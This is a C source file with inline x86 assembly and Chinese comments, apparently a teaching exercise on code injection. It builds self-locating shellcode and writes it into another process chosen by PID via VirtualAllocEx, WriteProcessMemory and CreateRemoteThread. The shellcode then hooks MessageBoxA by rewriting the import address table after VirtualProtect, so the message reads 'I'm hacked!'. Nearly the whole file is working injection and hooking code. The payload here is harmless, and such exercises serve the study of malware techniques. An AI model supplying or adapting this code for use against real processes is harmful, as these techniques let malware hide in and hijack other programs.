#include<windows.h>
#include<stdio.h>
#pragma comment(lib, "user32.lib")
PBYTE pRemoteCode, pCode, pOrignCode;
DWORD dwSizeOfCode;
/*
	要找目标程序的MessageBoxA的地址，先要找到目标进程的基地址，所以要在调用getMoudleHandle
*/

//下面是即将被注入的代码
void code_start();              // code_start是二进制码的开始标记
void _str_msgboxa();            // _str_msgboxa标记存放字符串的地址
void _addr_MyMessageBoxA();
void _addr_VirtualProtect();
void _addr_MessageBoxA();
void _addr_GetModuleHandleA();  //_addr_GetModuleHandleA 标记存放API入口地址的地址
void GetIAFromImportTable(DWORD dwBase, LPCSTR lpszFuncName); // 寻找IA的函数
//这里请填入需要一并被注入的函数代码
void code_end();                // code_end是二进制码的结束标记
// 上面是即将被注入的代码
__declspec(naked) void code_start()
{
    __asm {
        push ebp
        mov  ebp, esp
        push ebx
//Local variables
        sub  esp, 0x10
        // ebp - 0x0C ===> ImageBase
// self-locating 自定位 请阅读并理解下面3条指令的含义
        call _delta
_delta:
        pop  ebx
		//把当前地址存如ebx，然后减去偏移地址，所以ebx中保存的是注入代码的基地址
        sub  ebx, offset _delta
// 调用GetModuleHandleA()
        push 0
        lea  ecx, [ebx + _addr_GetModuleHandleA]
        call dword ptr [ecx]
        cmp  eax, 0x0
        jne  _cont1
        mov  eax, 0x1
        jmp  _ret
_cont1:
        mov  [ebp-0x0C], eax
// 调用GetIAFromImportTable();
        lea  ecx, [ebx + _str_msgboxa]
        push ecx
        push [ebp-0x0C]
        call offset GetIAFromImportTable
        add  esp, 0x8
        cmp  eax, 0x0
        mov ecx,[eax]                       //messbox的实际地址
        mov [ebx + _addr_MessageBoxA],ecx  //把真正的messagebox的地址保存起来
        push eax                            //把messagebox的入口地址保存起来
     /************VirtualProtect**************/
            push        55//开辟一个局部变量
            push        esp//把局部变量的地址压入栈
            push        0x40//请求的保护模式
            push        4   //要修改的字节数
            push        eax //要修改的首地址
            lea edx,[ebx + _addr_VirtualProtect]//edx可以随便用吧
            call   dword ptr [edx]
            pop         eax//回收局部变量空间            
     /************VirtualProtect**************/
               //获得可写权限后，可以把自己函数的地址写入IAT
        pop eax//恢复eax的值，里面是messagebox的入口地址
        lea ecx,[ebx + _addr_MyMessageBoxA]//ecx保存自己的函数地址 
        mov [eax],ecx//change IAT
        /*test MyMessageBox*/
        // lea ecx,[ebx + _str_msgboxa]
        // push 0
        // push ecx
        // push ecx
        // push 0
        // call offset _addr_MyMessageBoxA
        jne  _ret
        mov  eax, 0x2
_ret:
        add  esp, 0x20
        pop  ebx
        mov  esp, ebp
        pop  ebp
        ret
    }
}
// _str_msgboxa是字符串”MessageBoxA”的地址
__declspec(naked) void _str_msgboxa()
{
    __asm {
        _emit 'M'
        _emit 'e'
        _emit 's'
        _emit 's'
        _emit 'a'
        _emit 'g'
        _emit 'e'
        _emit 'B'
        _emit 'o'
        _emit 'x'
        _emit 'A'
        _emit 0x0
    }
}
__declspec(naked) void _addr_MyMessageBoxA()
{
    __asm {
     
        call _delta2
_delta2:
        pop eax
        sub eax, offset _delta2
        //找到基地址
         lea  ecx, [eax + _str_hacked]
         mov [esp+8],ecx
         jmp  dword ptr [eax + _addr_MessageBoxA]   //need relocation
_str_hacked:
        _emit 'I'
        _emit '\''
        _emit 'm'
        _emit ' '
        _emit 'h'
        _emit 'a'
        _emit 'c'
        _emit 'k'
        _emit 'e'
        _emit 'd'
        _emit '!'
        _emit 0x0
   }
}
__declspec(naked) void _addr_MessageBoxA()
{
    __asm{
         _emit 0xAA
         _emit 0xBB
         _emit 0xAA
         _emit 0xDD
        }
}
__declspec(naked) void _addr_VirtualProtect()
{
    __asm{
         _emit 0xAA
         _emit 0xBB
         _emit 0xAA
         _emit 0xDD
        }
}

// _addr_GetModuleHandleA是存放GetModuleHandleA()的全局变量
__declspec(naked) void _addr_GetModuleHandleA()
{
    __asm {
        _emit 0xAA
        _emit 0xBB
        _emit 0xAA
        _emit 0xEE
    }
}
// 这里请填入GetIAFromImportTable()函数的相关代码


/******************GetIAFromImportTable***********************************/
/**/__declspec(naked) void GetIAFromImportTable(DWORD dwBase, LPCSTR lpszFuncName)
/**/{
    __asm{
        //jmp 是位置无关代码,所以把jmp改为标号即可
        
                                _GetIAFromImportTable:
 /*  000000F0: 55         */         push        ebp
  /* 000000F1: 8B EC       */        mov         ebp,esp
  /* 000000F3: 83 EC 14    */        sub         esp,14h
 /*  000000F6: 8B 45 08    */        mov         eax,dword ptr [ebp+8]
 /*  000000F9: 89 45 FC    */        mov         dword ptr [ebp-4],eax
 /*  000000FC: 8B 4D FC    */        mov         ecx,dword ptr [ebp-4]
  /* 000000FF: 8B 55 08    */        mov         edx,dword ptr [ebp+8]
 /*  00000102: 03 51 3C    */        add         edx,dword ptr [ecx+3Ch]
 /*  00000105: 89 55 F8    */        mov         dword ptr [ebp-8],edx
 /*  00000108: 8B 45 F8    */        mov         eax,dword ptr [ebp-8]
 /*  0000010B: 83 C0 18    */        add         eax,18h
 /*  0000010E: 89 45 F4    */        mov         dword ptr [ebp-0Ch],eax
 /*  00000111: B9 08 00 00 00 */     mov         ecx,8
 /*  00000116: C1 E1 00     */       shl         ecx,0
 /*  00000119: 8B 55 F4     */       mov         edx,dword ptr [ebp-0Ch]
 /*  0000011C: 8B 44 0A 60  */       mov         eax,dword ptr [edx+ecx+60h]
 /*  00000120: 89 45 F0    */        mov         dword ptr [ebp-10h],eax
 /*  00000123: 8B 4D 08    */        mov         ecx,dword ptr [ebp+8]
 /*  00000126: 03 4D F0    */        add         ecx,dword ptr [ebp-10h]
 /*  00000129: 89 4D EC    */        mov         dword ptr [ebp-14h],ecx
 /*  0000012C: 8B 55 EC    */        mov         edx,dword ptr [ebp-14h]
 /*  0000012F: 52          */        push        edx
 /*  00000130: 8B 45 0C    */        mov         eax,dword ptr [ebp+0Ch]
 /*  00000133: 50          */        push        eax
  /* 00000134: 8B 4D 08    */        mov         ecx,dword ptr [ebp+8]
 /*  00000137: 51          */        push        ecx
 /*  00000138: E8 00 00 00 00 */     call        _GetIAFromImpDesc
 /*  0000013D: 83 C4 0C      */      add         esp,0Ch
 /*  00000140: 8B E5         */      mov         esp,ebp
 /*  00000142: 5D           */       pop         ebp
  /* 00000143: C3           */       ret
  
  
  
  
                                    _CompStr:
 /* 00000000: 55*/                   push        ebp
 /*   00000001: 8B EC  */            mov         ebp,esp
 /*  00000003: 83 EC 08 */           sub         esp,8
 /*  00000006: 8B 45 08 */           mov         eax,dword ptr [ebp+8]
 /*  00000009: 89 45 FC */           mov         dword ptr [ebp-4],eax
 /*  0000000C: 8B 4D 0C */           mov         ecx,dword ptr [ebp+0Ch]
 /*  0000000F: 89 4D F8 */           mov         dword ptr [ebp-8],ecx
 /*  00000012: EB 12      */         jmp         s12
 /*  00000014: 8B 55 FC */      s9:
                                     mov         edx,dword ptr [ebp-4]
 /*  00000017: 83 C2 01 */           add         edx,1
 /*  0000001A: 89 55 FC */           mov         dword ptr [ebp-4],edx
 /*  0000001D: 8B 45 F8 */           mov         eax,dword ptr [ebp-8]
 /*  00000020: 83 C0 01 */           add         eax,1
 /*  00000023: 89 45 F8  */          mov         dword ptr [ebp-8],eax
 /*  s00000026: 8B 4D FC */      s12:
                                     mov         ecx,dword ptr [ebp-4]
 /*  00000029: 0F BE 11  */          movsx       edx,byte ptr [ecx]
 /*  0000002C: 85 D2      */         test        edx,edx
 /*  0000002E: 74 20       */        je          s11
 /*  00000030: 8B 45 F8   */         mov         eax,dword ptr [ebp-8]
 /*  00000033: 0F BE 08    */        movsx       ecx,byte ptr [eax]
 /*  00000036: 85 C9       */        test        ecx,ecx
 /*  00000038: 74 16       */        je          s11
 /*  0000003A: 8B 55 FC    */        mov         edx,dword ptr [ebp-4]
 /*  0000003D: 0F BE 02    */        movsx       eax,byte ptr [edx]
 /*  00000040: 8B 4D F8    */        mov         ecx,dword ptr [ebp-8]
 /*  00000043: 0F BE 11    */        movsx       edx,byte ptr [ecx]
 /*  00000046: 3B C2       */        cmp         eax,edx
 /*  00000048: 74 04       */        je          s10
 /*  0000004A: 33 C0       */        xor         eax,eax
 /*  0000004C: EB 07       */        jmp         s8
 /*  0000004E: EB C4        */ s10:
                                      jmp         s9
 /*  00000050: B8 01 00 00 00 */ s11:
                                     mov         eax,1
 /*  00000055: 8B E5         */ s8:
                                     mov         esp,ebp
 /*  00000057: 5D           */       pop         ebp
 /*  00000058: C3           */       ret
                            
                            
                            
                               _GetIAFromImpDesc:
  /* 00000060: 55           */       push        ebp
 /*  00000061: 8B EC      */         mov         ebp,esp
 /*  00000063: 83 EC 0C     */       sub         esp,0Ch
 /*  00000066: 8B 45 10     */       mov         eax,dword ptr [ebp+10h]
 /*  00000069: 83 78 0C 00  */       cmp         dword ptr [eax+0Ch],0
 /*  0000006D: 75 04        */       jne         s1
  /* 0000006F: 33 C0        */       xor         eax,eax
 /*  00000071: EB 6C        */       jmp         s7
 /*  00000073: 8B 4D 10     */   s1:  
                                     mov         ecx,dword ptr [ebp+10h]
 /*  00000076: 8B 55 08     */       mov         edx,dword ptr [ebp+8]
 /*  00000079: 03 11        */       add         edx,dword ptr [ecx]
 /*  0000007B: 89 55 FC     */       mov         dword ptr [ebp-4],edx
 /*  0000007E: 8B 45 10     */       mov         eax,dword ptr [ebp+10h]
 /*  00000081: 8B 4D 08     */       mov         ecx,dword ptr [ebp+8]
 /*  00000084: 03 48 10     */       add         ecx,dword ptr [eax+10h]
 /*  00000087: 89 4D F8     */       mov         dword ptr [ebp-8],ecx
 /*  0000008A: EB 12        */       jmp         s2
 /*  0000008C: 8B 55 FC     */   s5:
                                     mov         edx,dword ptr [ebp-4]
 /*  0000008F: 83 C2 04     */       add         edx,4
 /*  00000092: 89 55 FC     */       mov         dword ptr [ebp-4],edx
 /*  00000095: 8B 45 F8     */       mov         eax,dword ptr [ebp-8]
 /*  00000098: 83 C0 04     */       add         eax,4
 /*  0000009B: 89 45 F8     */       mov         dword ptr [ebp-8],eax
 /*  0000009E: 8B 4D FC     */   s2:
                                     mov         ecx,dword ptr [ebp-4]
 /*  000000A1: 83 39 00      */      cmp         dword ptr [ecx],0
 /*  000000A4: 74 37        */       je          s3
 /*  000000A6: 8B 55 FC    */        mov         edx,dword ptr [ebp-4]
 /*  000000A9: 8B 02        */       mov         eax,dword ptr [edx]
 /*  000000AB: 25 00 00 00 80*/      and         eax,80000000h
 /*  000000B0: 74 02         */      je          s4
 /*  000000B2: EB D8        */       jmp         s5
 /*  000000B4: 8B 4D FC      */  s4:
                                     mov         ecx,dword ptr [ebp-4]
 /*  000000B7: 8B 55 08      */      mov         edx,dword ptr [ebp+8]
 /*  000000BA: 03 11        */       add         edx,dword ptr [ecx]
 /*  000000BC: 89 55 F4      */      mov         dword ptr [ebp-0Ch],edx
 /*  000000BF: 8B 45 F4      */      mov         eax,dword ptr [ebp-0Ch]
 /*  000000C2: 83 C0 02     */       add         eax,2
 /*  000000C5: 50            */      push        eax
 /*  000000C6: 8B 4D 0C      */      mov         ecx,dword ptr [ebp+0Ch]
 /*  000000C9: 51            */      push        ecx
 /*  000000CA: E8 00 00 00 00 */     call        _CompStr
 /*  000000CF: 83 C4 08       */     add         esp,8
 /*  000000D2: 85 C0         */      test        eax,eax
 /*  000000D4: 74 05         */      je          s6
 /*  000000D6: 8B 45 F8      */      mov         eax,dword ptr [ebp-8]
 /*  000000D9: EB 04        */       jmp         s7
 /*  000000DB: EB AF         */  s6:
                                     jmp         s5
 /*  000000DD: 33 C0         */  s3:
                                     xor         eax,eax
 /*  000000DF: 8B E5         */  s7:
                                     mov         esp,ebp
  /* 000000E1: 5D             */     pop         ebp
                                     ret

     }
/**/}
/******************GetIAFromImportTable***********************************/

__declspec(naked) void code_end()
{
    __asm _emit 0xCC
}
// make_code()函数是将开始标记code_start和结束标记code_end之间的所有二进制数据拷贝到一个缓冲区中
DWORD make_code()
{
    int off; 
    DWORD func_addr,protect;
    HMODULE hModule;
    __asm {
        mov edx, offset code_start
        mov dword ptr [pOrignCode], edx
        mov eax, offset code_end
        sub eax, edx
        mov dword ptr [dwSizeOfCode], eax
    }
    pCode = VirtualAlloc(NULL, dwSizeOfCode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (pCode== NULL) {
        printf("[E]: VirtualAlloc failed\n");
        return 0;
    }
   // printf("[I]: VirtualAlloc ok --> at 0x%08x.\n", (pCode);
    for (off = 0; off<dwSizeOfCode; off++) {
        *(pCode+off) = *(pOrignCode+off);
    }
   // printf("[I]: Copy code ok --> from 0x%08x to 0x%08x with size of 0x%08x.\n", 
    //    pOrignCode, pCode, dwSizeOfCode);
    hModule = LoadLibrary("kernel32.dll");
    if (hModule == NULL) {
        printf("[E]: kernel32.dll cannot be loaded. \n");
        return 0;
    }
    func_addr = (DWORD)GetProcAddress(hModule, "GetModuleHandleA");
    protect = (DWORD)GetProcAddress(hModule, "VirtualProtect");
    //获取VirtualProtect的地址
    if (func_addr == 0) {
        printf("[E]: GetModuleHandleA not found. \n");
        return 0;
    }
    off = (DWORD)pCode - (DWORD)pOrignCode;
    *(PDWORD)((PBYTE)_addr_GetModuleHandleA + off) = func_addr;
    *(PDWORD)((PBYTE)_addr_VirtualProtect + off) = protect;
    //把VirtualProtect的地址写入pcode的相应位置
    return dwSizeOfCode;
}
// inject_code()函数是存放在pCode所指向的缓冲区中的二进制代码注入到远程进程中
int inject_code(DWORD pid)
{
    //请填入代码，完成注入过程
    int exitcode=0;
    HANDLE hproc = 0;
    DWORD dwThreadId;
    PVOID pRemoteThread ;
    HANDLE  hThread	= 0;
 hproc = OpenProcess(PROCESS_CREATE_THREAD 
        | PROCESS_QUERY_INFORMATION
        | PROCESS_VM_OPERATION 
        | PROCESS_VM_WRITE 
        | PROCESS_VM_READ,
        FALSE, pid);
        pRemoteThread = VirtualAllocEx(hproc, NULL, dwSizeOfCode, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        WriteProcessMemory(hproc,pRemoteThread,pCode,dwSizeOfCode,0);
        hThread=CreateRemoteThread(hproc,0,0,pRemoteThread,pRemoteThread,0,&dwThreadId);
        WaitForSingleObject(hThread, INFINITE);
        GetExitCodeThread(hThread, (PDWORD) &exitcode);
        printf(">exitcode is 0x%08x\n",exitcode);
       // VirtualFreeEx(hproc, pRemoteThread, 0, MEM_RELEASE);
       //这里不能释放开辟出来的空间，我们的mymessagebox还在空间内
        if (!CloseHandle(hproc)) 
        {
        printf("[E]: Process (%d) cannot be closed !\n", pid);
        return 2;
        };
        printf("[I]: Process (%d) is closed. \n", pid);
        return 0;
}


int main(int argc, char *argv[])
{
    DWORD pid = 0;
    // 为pid赋值为hello.exe的进程ID
    if (argc < 2) {
        printf("Usage: %s pid\n", argv[0]);
        return -1;
    }
    pid = atoi(argv[1]);
    if (pid <= 0) {
        printf("[E]: pid must be positive (pid>0)!\n"); 
        return -2;
    }
    
    make_code();
    inject_code(pid);
    printf("[inject_code]:done!\n");
    return 0;
}